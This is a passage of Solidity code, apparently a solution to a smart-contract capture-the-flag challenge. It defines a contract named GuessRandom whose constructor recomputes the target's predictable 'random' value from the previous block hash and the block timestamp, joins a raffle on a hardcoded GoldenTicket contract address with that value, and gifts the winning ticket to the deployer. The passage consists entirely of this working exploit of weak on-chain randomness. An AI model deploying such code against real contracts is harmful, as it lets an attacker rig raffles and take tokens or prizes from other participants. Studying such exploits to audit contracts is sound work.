...
contract GuessRandom {
    constructor() {
        uint256 randomNumber = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)));
        GoldenTicket(0x25F7f94a79d5Db18FEa10ee1Fe114E411301eB98).joinRaffle(randomNumber);
        GoldenTicket(0x25F7f94a79d5Db18FEa10ee1Fe114E411301eB98).giftTicker(msg.sender);
    }
}